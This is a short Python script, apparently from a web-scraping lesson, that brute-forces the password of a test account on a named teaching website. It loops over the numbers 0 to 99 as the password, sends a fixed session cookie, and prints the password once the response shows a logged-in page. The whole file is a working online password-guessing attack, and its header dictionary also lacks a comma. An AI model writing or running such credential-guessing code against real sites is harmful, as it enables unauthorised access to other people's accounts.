import csv
import codecs
import requests
import io
import json
from bs4 import BeautifulSoup


pwd=["a","b","c"]

h={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Accept-Language":"zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    "Cookie":"PHPSESSID=35ehmjkl2m60f7mve7t1mlmgl1"
}

for q in range(0,100):
    r1=requests.post(
        "https://teaching.bo-yuan.net/",headers=h,
        params={"uid":"5f0037811b641"},
        data={
            "ex[class]":"5edd088997c35",
            "ex[username]":"99測試2",
            "ex[password]":q
        }
    )
    r2=requests.get("https://teaching.bo-yuan.net/",headers=h)
    r2.encoding="utf8"
    if r2.text.find("?ac1=member")!=-1:
        print("登入成功, 密碼是:",q)
        break

# r2=requests.get(
#     "https://teaching.bo-yuan.net/",
#     headers=h
# )
# r2.encoding="utf8"
# print(r2.text)
